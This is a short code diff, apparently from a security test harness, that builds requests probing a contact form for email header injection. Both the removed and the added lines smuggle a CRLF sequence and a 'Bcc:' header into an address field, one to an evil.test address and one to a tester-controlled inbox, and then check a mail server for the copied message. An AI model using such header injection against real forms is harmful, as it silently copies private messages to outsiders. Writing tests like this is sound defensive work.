-                 "data": {v.param: "attacker@evil.test\r\nBcc: victim@evil.test",
-                          "subject": "Account notice"}}]
+        # A Bcc header smuggled into the address field copies the internal
+        # message to an address the tester reads.
+        return [
+            {"method": "POST", "path": v.route,
+             "data": {v.param: f"alice@orbitdesk.local\r\nBcc: me@{config.INBOX_DOMAIN}",
+                      "subject": "Question about my invoice"}},
+            {"server": "mail", "method": "GET", "path": "/api/messages"},
+        ]
     return []
